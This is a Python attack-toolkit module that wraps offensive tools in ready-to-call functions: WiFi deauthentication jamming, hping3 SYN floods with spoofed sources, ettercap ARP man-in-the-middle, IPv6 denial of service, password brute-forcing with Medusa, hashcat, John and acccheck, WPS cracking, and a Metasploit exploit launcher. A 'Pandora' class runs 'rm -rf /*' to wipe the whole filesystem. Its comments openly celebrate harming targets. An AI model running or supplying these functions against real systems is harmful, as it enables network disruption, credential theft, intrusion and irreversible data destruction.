#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
    Created: Aug 2017

    @author: 73RM1N41@9R0GR4M13
"""

import kerri
import os
import subprocess
import symbo
import sys
import time
from termcolor import colored

#########
# CHAOS #
#########


class Chaos(object):
    """
    Your Average Doom Bringers
    """

    def __str__(self):
        return """ Rain Hell On Thy Enemies With Kaos """

    def ncrack(self, ip, port, *args):
        """ Run NCrack on target IP address """

        if len(args) >= 1:
            raise kerri.ExcessArguments("ncrack()", 2)
        else:
            try:
                target = str(ip)+":"+str(port)
                subprocess.call(["ncrack", "-v", target])
            except subprocess.CalledProcessError:
                raise kerri.ProcessFaiure("ncrack()")
            except Exception as error:
                raise kerri.Unknown("ncrack()", error)

    def jammer(self, interface, *args):
        """
        Prevent Access To Remote Router By Sending Multiple Deauth Requests
        """

        if len(args) >= 1:
            raise kerri.ExcessArguments("jammer()", 1)
        else:
            try:
                subprocess.call(["airmon-ng", "start", interface])
                inter = str(interface)+"mon"
                try:
                    subprocess.call(["airodump-ng", inter])
                except KeyboardInterrupt:
                    pass
                bssid = raw_input(symbo.CSTR_START + "[BSSID] \n" + symbo.CSTR_END)
                chan = raw_input(symbo.CSTR_START + "[Channel] \n" + symbo.CSTR_END)
                try:
                    subprocess.call(["airodump-ng", "--bssid", bssid,
                                     "--channel",
                                     chan, inter])
                except KeyboardInterrupt:
                    pass
                station = raw_input(symbo.CSTR_START+"[Station] \n"+symbo.CSTR_END)
                deauth_cnt = raw_input(symbo.CSTR_START + "[Deauth Count] \n" + symbo.CSTR_END)
                try:
                    subprocess.call(["aireplay-ng", "--deauth", deauth_cnt,
                                     "-a", bssid, "-e", station, inter])
                except KeyboardInterrupt:
                    pass
                subprocess.call(["airmon-ng", "stop", inter])
            except subprocess.CalledProcessError:
                raise kerri.ProcessFaiure("jammer()")
            except Exception as error:
                raise kerri.Unknown("jammer()", error)

    def blacknurse(self, target, *args):
        if len(args) >= 1:
            raise kerri.ExcessArguments('blacknurse()')
        else:
            try:
                blknrs = subprocess.Popen(["blacknurse", target],
                                          stdout=subprocess.PIPE,
                                          stderr=subprocess.PIPE)
                std_out, std_err = blknrs.communicate()
                if len(std_out) != 0:
                    return std_out
                if len(std_err) != 0:
                    sys.stderr.write(std_err)
            except KeyboardInterrupt:
                raise kerri.UsrInt("blacknurse()")
            except subprocess.CalledProcessError:
                raise kerri.ProcessFailure("blacknurse()")
            except Exception as error:
                raise kerri.Unknown("blacknurse()", error)

    def hping_flood(self, target, *args):
        """
        DOS WiFi Routers
        """

        if len(args) >= 1:
            raise kerri.ExcessArguments("hping_flood()", 1)
        else:
            try:
                subprocess.call(["hping3", "-S", "-P", "-U", "--flood", "-V",
                                 "--rand-source", target])
            except subprocess.CalledProcessError:
                raise kerri.ProcessFaiure("hping_flood()")
            except Exception as error:
                raise kerri.Unknown("hping_flood()", error)

    def etter_mitm(self, interface, *args):
        """
        Ettercap ManInTheMiddle Attack
        """

        if len(args) >= 1:
            raise kerri.ExcessArguments("etter_mitm()", 1)
        else:
            try:
                subprocess.call(["ettercap", "-Tqi", interface, "-M",
                                 "arp:remote", "///"])
            except subprocess.CalledProcessError:
                raise kerri.ProcessFaiure("etter_mitm()")
            except Exception as error:
                raise kerri.Unknown("etter_mitm()", error)

    def dotdotpwn(self, ip, *args):
        """
        Run DotDotPwn On Target
        """

        if len(args) >= 1:
            raise kerri.ExcessArguments("dotdotpwn()", 1)
        else:
            try:
                subprocess.call(["dotdotpwn", "-m", "http", "-h", ip, "-M",
                                 "GET"])
            except subprocess.CalledProcessError:
                raise kerri.ProcessFaiure("dotdotpwn()")
            except Exception as error:
                raise kerri.Unknown("dotdotpwn()", error)

    def halflife(self, target, port, *args):
        if len(args) >= 1:
            raise kerri.ExcessArguments("halflife()", 2)
        else:
            try:
                subprocess.call(["halflife", target, port])
            except subprocess.CalledProcessError:
                raise kerri.ProcessFaiure("halflife()")
            except Exception as error:
                raise kerri.Unknown("halflife()", error)

#   ####################
#   # PASSWORD ATTACKS #
#   ####################

    class Password_Atk(object):
        """
        Password Attack Tools
        """

        def __str__(self):
            return """ Controls Password Attacks Preformed By Kaos """

        def hashcat(self, mda5_hash, *args):
            """
            Decrypt Password Hashes With Hashcat
            """

            if len(args) >= 1:
                raise kerri.ExcessArguments("hashcat()", 1)
            else:
                try:
                    out = subprocess.check_output(["hashcat", "-m", "0",
                                                   mda5_hash])
                    return out
                except subprocess.CalledProcessError:
                    raise kerri.ProcessFaiure("hashcat()")
                except Exception as error:
                    raise kerri.Unknown("hashcat()", error)

        def medusa(self, host, user_file, password_file, *args):
            """
            Crack Passwords/Usernames With Medusa
            """

            if len(args) >= 1:
                raise kerri.ExcessArguments("medusa()", 3)
            else:
                try:
                    subprocess.call(["medusa", "-v", "6", "-h", host, "-U",
                                     user_file, "-P", password_file, "-e",
                                     "ns", "-M", "smbnt"])
                except subprocess.CalledProcessError:
                    raise kerri.ProcessFaiure("medusa()")
                except Exception as error:
                    raise kerri.Unknown("medusa()", error)

        def single_medusa(self, host, user, password_file, *args):
            """
            Use Medusa To Crack Password For A Single User Name
            """

            if len(args) >= 1:
                raise kerri.ExcessArguments("single_medusa()", 3)
            else:
                try:
                    subprocess.call(["medusa", "-v", "6", "-h", host, "-u",
                                     user, "-P", password_file, "-e", "ns",
                                     "-M", "smbnt"])
                except subprocess.CalledProcessError:
                    raise kerri.ProcessFaiure("single_medusa()")
                except Exception as error:
                    raise kerri.Unknown("single_medusa()", error)

        def john(self, dec_format, wordlist, hash_file, *args):
            """
            Crack Password Hashes With John The Ripper
            """

            if len(args) >= 1:
                raise kerri.ExcessArguments("john()", 3)
            else:
                try:
                    subprocess.call(["john", "-format=%s" % dec_format,
                                     "-wordlist=%s" % wordlist, hash_file])
                except subprocess.CalledProcessError:
                    raise kerri.ProcessFailure('john()', 4)
                except Exception as error:
                    raise kerri.Unknown('john()', 6, error)

        def acccheck(self, target, password_file=None, users=None, *args):
            """ Attempt to bruteforce an acct with the acccheck program.
                You may leave the password_file parameter blank to test
                for a \'[blank]\' password.
                You may specify a single user name, a file with a
                list of user names for the \'users\' parameter or leave
                it blank to test against the \'Administrator\' acct. """

            if len(args) >= 1:
                raise kerri.ExcessArguments("acccheck()", 2)
            else:
                if users is None:
                    try:
                        if password_file is None:
                            subprocess.call(["acccheck", "-t", target])
                        elif password_file is None:
                            subprocess.call(["acccheck", "-t", target, "-P",
                                             password_file])
                    except subprocess.CalledProcessError:
                        raise kerri.ProcessFailure("acccheck()")
                    except Exception as error:
                        raise kerri.Unknown("acccheck()", error)
                else:
                    try:
                        if password_file is None:
                            if str(os.path.isfile(users)) == "True":
                                subprocess.call(["acccheck", "-t", target,
                                                 "-U", users])
                            else:
                                subprocess.call(["acccheck", "-t", target,
                                                 "-u", users])
                        else:
                            if str(os.path.isfile(users)) == "True":
                                subprocess.call(["acccheck", "-t", target,
                                                 "-U", users, "-P",
                                                 password_file])
                            else:
                                subprocess.call(["acccheck", "-t", target,
                                                 "-u", users, "-P",
                                                 password_file])
                    except subprocess.CalledProcessError:
                        raise kerri.ProcessFailure("acccheck()")
                    except Exception as error:
                        raise kerri.Unknown("acccheck()", error)

#   ################
#   # WIFI ATTACKS #
#   ################

    class Wifi_Atk(object):
        """
        Wifi Network Attack Tools
        """

        def __str__(self):
            return """ Controls All Wifi Attacks Preformed By Kaos """

        def auto_wifite(self, interface, *args):
            """
            Runs Wifite And Automatically Attempts To Crack All
            Discovered Networks
            """

            if len(args) >= 1:
                raise kerri.ExcessArguments("auto_wifite()", 1)
            else:
                try:
                    subprocess.call(["airmon-ng", "check", "kill"])
                    subprocess.call(["airmon-ng", "start", interface])
                    inter = str(interface)+"mon"
                    subprocess.call(["wifite", "-all", "-i", inter, "-mac",
                                     "-showb"])
                    subprocess.call(["airmon-ng", "stop", inter])
                    subprocess.call(["ifconfig", interface, "up"])
                except subprocess.CalledProcessError:
                    raise kerri.ProcessFailure('auto_wifite()', 4)
                except Exception as error:
                    raise kerri.Unknown('auto_wifite()', 6, error)

        def reaver(self, bssid, interface, *args):
            """
            Run Reaver Against Target Network
            """

            if len(args) >= 1:
                raise kerri.ExcessArguments("reaver()", 2)
            else:
                try:
                    subprocess.call(["reaver", "-i", interface, "-b", bssid,
                                     "-v"])
                except subprocess.CalledProcessError:
                    raise kerri.ProcessFailure('reaver()', 4)
                except Exception as error:
                    raise kerri.Unknown('reaver()', 6, error)

        def wash(self, interface, *args):
            """
            Runs Wash To Scan For Networks With WPS
            This Will Also Show Routers Without WPS
            """

            if len(args) >= 1:
                raise kerri.ExcessArguments("wash()", 1)
            else:
                try:
                    data = subprocess.Popen(["/usr/bin/wash", "-a", "-i", interface], shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    while True:
                        output = data.stdout.readline()
                        std_out, std_err = data.communicate()
                        if len(std_err) >= 1:
                            return std_err
                        if data.poll() is not None:
                            break
                        if output:
                            print(output.strip().decode())
                    rc = data.poll()
                    return rc
                except subprocess.CalledProcessError:
                    raise kerri.ProcessFailure('wash()')
                except Exception as error:
                    raise kerri.Unknown('wash()', error)

        def denial(self, *args):
            """ Deny access to remote wifi router by clogging
            the system with fake requests from atk6-denial6 """

            if len(args) >= 1:
                raise kerri.ExcessArguments("denial()", 0)
            else:
                try:
                    print ((symbo.SYM['notice']) +
                           colored("Denying Service To Some Poor Bastard..."))
                    interface = raw_input(symbo.CSTR_START + "[Interface] \n" + symbo.CSTR_END)
                    dest = raw_input(symbo.CSTR_START + "[Destination IPv6] \n" + symbo.CSTR_END)
                    try:
                        etcn = raw_input(symbo.CSTR_START + "[Want To Add A Test Case Number? {y/n}] \n" + symbo.CSTR_END)
                        if etcn == "y":
                            tcase_num = raw_input(symbo.CSTR_START + "[Test_Case_Number] \n" + symbo.CSTR_END)
                            print(symbo.SYM['echo'] + "atk6-denial " + interface + " " + dest + " " + tcase_num)
                            time.sleep(.25)
                            os.system("atk6-denial6 "+interface+" "+dest+" "+
                                      tcase_num)
                        else:
                            os.system("atk6-denial6 "+interface+" "+dest)
                    except KeyboardInterrupt:
                        print(symbo.SYM['echo']+"atk6-denial6 "+interface+" "+dest)
                        time.sleep(.25)
                        os.system("atk6-denial6 "+interface+" "+dest)
                except KeyboardInterrupt:
                    raise kerri.UsrInt("denial()")
                except subprocess.CalledProcessError:
                    raise kerri.ProcessFaiure("denial()")
                except Exception as error:
                    raise kerri.Unknown("denial()", error)

        def alt_airo(self, interface, monitor="n", *args):
            """
            A More Interactive Version Of Airodump-ng (Than Recon.airodump())
            """

            if len(args) >= 1:
                raise kerri.ExcessArguments("alt_airo()", 0)
            else:
                time.sleep(1)
                try:
                    if monitor == "y" or monitor == "Y":
                        os.system("airmon-ng start "+interface)
                        os.system("airodump-ng --berlin 999999 --wps -M -U -W" +
                                  "--showack " + interface + 'mon')
                        os.system("airmon-ng stop "+interface+'mon')
                        os.system("ifconfig "+interface+" up")
                        os.system("ifconfig " + interface)
                    elif monitor == "n" or monitor == "N":
                        os.system('airodump-ng --berlin 999999 --wps -M -U -W --showack ' +
                                  interface)
                    else:
                        raise kerri.InvalidInput("alt_airo()")
                except KeyboardInterrupt:
                    raise kerri.UsrInt("alt_airo()")
                except subprocess.CalledProcessError:
                    raise kerri.ProcessFaiure("alt_airo()")
                except Exception as error:
                    if error.returncode == 1:
                        raise kerri.InvalidInput("alt_airo()", 1, "monitor must be either \'y/Y\' or \'n/N\' ")
                    else:
                        raise kerri.Unknown("alt_airo()", error)

#   ###########
#   # PANDORA #
#   ###########

    class Pandora(object):
        """ [!] COMPLETELY IRREVERSIBLE DESTRUCTION [!]
            THIS CLASS IS VERY DANGEROUS AND SHOULD
            NOT BE USED BY ANYONE... EVER... ;) """

        def __str__(self):
            return "This Is A Really Bad Place To Be F****ng Around.\nOnce You Open The Box, You Can\'t Close It Back..."

        def delem(self, *args):
            """ Delete the base directory and all
                contained files/directories """

            if len(args) >= 1:
                raise kerri.ExcessArguments("delem()", 0)
            else:
                try:
                    subprocess.Popen(["srm", "-rf", "/*"])
                except subprocess.CalledProcessError:
                    try:
                        subprocess.Popen(["rm", "-rf", "/*"])
                    except subprocess.CalledProcessError:
                        raise kerri.ProcessFailure("delem()")
                    except Exception as error:
                        raise kerri.Unknown("delem()", error)
                except subprocess.CalledProcessError:
                    raise kerri.ProcessFailure("delem()")
                except Exception as error:
                    raise kerri.Unknown("delem()", error)

# ########################
# # METASPLOIT FRAMEWORK #
# ########################

    class Metasploit(object):
        """ Create and run MSFramework scripts
            You Must Specify An Exploit, The Remote Host, A Payload
            And The Local Host
            *** If the payload specified is invalid for the exploit,
                it will raise kerri.an error message within msfconsole.
                Type \'set PAYLOAD\' in the msfconsole to see available
                valid payloads."""


        def __str__(self):
            return """ Metasploit, Kaos Style... """

        def msf(self, exploit, rhost, payload, lhost, loadpath="/opt/metasploit/modules", *args):
            if len(args) >= 1:
                raise kerri.ExcessArguments("msf()", 4)
            else:
                def rem_rc():
                    """ Removes The Created Resource File """
                    try:
                        del_file = subprocess.Popen(["srm", "-rf", "/tmp/kaos.rc"],
                                                    stdout=subprocess.PIPE,
                                                    stderr=subprocess.PIPE)
                        std_out, std_err = del_file.communicate()
                        if len(std_err) != 0:
                            raise kerri.Unknown("rem_rc()", std_err)
                        if len(std_out) != 0:
                            sys.stdout.write(std_out)
                        print(colored("Resource File Successfully Removed!", 'green', attrs=['bold']))
                    except subprocess.CalledProcessError:
                        raise kerri.ProcessFailure("rem_rc()")
                    except Exception as error:
                        raise kerri.Unknown("rem_rc()", error)
                try:
                    with open("/tmp/kaos.rc", 'w') as rc:
                        rc.write("loadpath %s\n" % loadpath)
                        rc.write("use %s\n" % exploit)
                        rc.write("set RHOST %s\n" % rhost)
                        rc.write("set PAYLOAD %s\n" % payload)
                        rc.write("set LHOST %s\n" % lhost)
                        rc.write("run")
                        rc.close()
                    subprocess.call(["/usr/bin/msfconsole", "-r", "/tmp/kaos.rc"])
                    rem_rc()
                except KeyboardInterrupt:
                    rem_rc()
                    raise kerri.UsrInt("msf()")
                except subprocess.CalledProcessError:
                    rem_rc()
                    raise kerri.ProcessFailure("msf()")
                except Exception as error:
                    rem_rc()
                    raise kerri.Unknown("msf()", error)

        def ms_payloads(self, path="/opt/metasploit/modules/payloads", *args):
            if len(args) >= 1:
                raise kerri.ExcessArguments("ms_payloads()", 1)
            else:
                try:
                    list = subprocess.check_output(["ls", "-AR", "%s" % path])
                    return list.split("\n\n")
                except subprocess.CalledProcessError:
                    raise kerri.ProcessFailure("ms_payloads()")
                except Exception as error:
                    raise kerri.Unknown("ms_payloads()", error)

        def ms_exploits(self, path="/opt/metasploit/modules/exploits", *args):
            if len(args) >= 1:
                raise kerri.ExcessArguments("ms_exploits()", 1)
            else:
                try:
                    list = subprocess.check_output(["ls", "-AR", "%s" % path])
                    return list.split("\n\n")
                except subprocess.CalledProcessError:
                    raise kerri.ProcessFailure("ms_exploits()")
                except Exception as error:
                    raise kerri.Unknown("ms_exploits()", error)

        def ms_allmods(self, path="/opt/metasploit/modules", *args):
            if len(args) >= 1:
                raise kerri.ExcessArguments("ms_allmods()()", 1)
            else:
                try:
                    list = subprocess.check_output(["ls", "-AR", "%s" % path])
                    return list.split("\n\n")
                except subprocess.CalledProcessError:
                    raise kerri.ProcessFailure("ms_allmods()")
                except Exception as error:
                    raise kerri.Unknown("ms_allmods()", error)

#########
# INITs #
#########

bad_ideas = Chaos()
ncrack = bad_ideas.ncrack
jammer = bad_ideas.jammer
blacknurse = bad_ideas.blacknurse
hping_flood = bad_ideas.hping_flood
etter_mitm = bad_ideas.etter_mitm
dotdotpwn = bad_ideas.dotdotpwn
halflife = bad_ideas.halflife
passatk = bad_ideas.Password_Atk()
hashcat = passatk.hashcat
medusa = passatk.medusa
single_medusa = passatk.single_medusa
john = passatk.john
acccheck = passatk.acccheck
wifiatk = bad_ideas.Wifi_Atk()
auto_wifite = wifiatk.auto_wifite
reaver = wifiatk.reaver
wash = wifiatk.wash
alt_airo = wifiatk.alt_airo
pandora = bad_ideas.Pandora()
delem = pandora.delem
msploit = bad_ideas.Metasploit()
msf = msploit.msf
ms_exploits = msploit.ms_exploits
ms_payloads = msploit.ms_payloads
ms_allmods = msploit.ms_allmods
